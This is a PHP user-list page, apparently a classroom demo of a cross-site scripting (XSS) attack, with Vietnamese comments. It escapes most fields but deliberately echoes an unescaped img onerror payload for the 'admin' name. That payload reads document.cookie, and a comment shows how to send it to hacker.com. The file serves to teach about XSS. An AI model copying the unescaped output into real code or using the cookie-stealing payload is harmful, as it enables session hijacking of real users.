<?php
// Start the session
session_start();

require_once 'models/UserModel.php';
$userModel = new UserModel();

require_once 'redis_connection.php';


$params = [];
if (!empty($_GET['keyword'])) {
    $params['keyword'] = $_GET['keyword'];
}

$users = $userModel->getUsers($params);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Home</title>
    <?php include 'views/meta.php' ?>
</head>
<body>
<?php include 'views/header.php'?>
<div class="container">
    <?php if (!empty($users)) {?>
        <div class="alert alert-danger" role="alert">
            DEMO TẤN CÔNG XSS: Chạy mã độc để đánh cắp dữ liệu.
        </div>
        <table class="table table-striped">
            <thead>
            <tr>
                <th scope="col">ID</th>
                <th scope="col">Username</th>
                <th scope="col">Fullname</th>
                <th scope="col">Type</th>
                <th scope="col">Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php foreach ($users as $user) {?>
                <tr>
                    <!-- Áp dụng htmlspecialchars() cho mọi dữ liệu hiển thị -->
                    <th scope="row"><?php echo htmlspecialchars($user['id'])?></th>
                    <td>
                        <?php
                        $malicious_name = $user['name'];
                        if ($user['name'] == 'admin') {
                            // MÃ ĐỘC MỚI: Lấy cookie và hiển thị nó trong thẻ <img>.
                            // Kẻ tấn công sẽ thay thế <img src=...> bằng yêu cầu gửi đến máy chủ của họ.
                            $malicious_name = "Admin 
                                <img src=x onerror='
                                    var stolenCookie = document.cookie;
                                    var victimUsername = \"admin\"; // Giả định
                                    var displayDiv = document.createElement(\"div\");
                                    
                                    // Tạo giao diện cảnh báo để thầy bạn thấy rõ
                                    displayDiv.innerHTML = \"<hr><b style=\\\"color:red;\\\">[ĐÃ BỊ TẤN CÔNG] Cookie bị đánh cắp: </b>\" + stolenCookie;
                                    displayDiv.style.border = \"2px solid red\";
                                    displayDiv.style.padding = \"10px\";
                                    displayDiv.style.marginTop = \"10px\";
                                    
                                    // Chèn cảnh báo vào đầu body của trang
                                    document.body.insertBefore(displayDiv, document.body.firstChild);
                                    
                                    // Thay vì hiển thị, kẻ tấn công sẽ gửi nó đến máy chủ của họ.
                                    // Ví dụ: new Image().src=\"http://hacker.com/log.php?c=\" + stolenCookie;
                                '>";

                        }
                        // LỖ HỔNG: In chuỗi mã độc trực tiếp ra HTML
                        echo $malicious_name;
                        ?>
                    </td>
                        
                    <td>
                        <?php echo htmlspecialchars($user['fullname'])?>
                    </td>
                    <td>
                        <?php echo htmlspecialchars($user['type'])?>
                    </td>
                    <td>
                        <a href="form_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
                            <i class="fa fa-pencil-square-o" aria-hidden="true" title="Update"></i>
                        </a>
                        <a href="view_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
                            <i class="fa fa-eye" aria-hidden="true" title="View"></i>
                        </a>
                        <a href="delete_user.php?id=<?php echo htmlspecialchars($user['id']) ?>">
                            <i class="fa fa-eraser" aria-hidden="true" title="Delete"></i>
                        </a>
                    </td>
                </tr>
            <?php } ?>
            </tbody>
        </table>
    <?php }else { ?>
        <div class="alert alert-dark" role="alert">
            This is a dark alert—check it out!
        </div>
    <?php } ?>
</div>

<script src="public/js/jquery-2.1.4.min.js"></script>
<script src="public/js/bootstrap.min-3.3.7.js"></script>
<script src="public/js/app.js"></script>
</body>
</html>
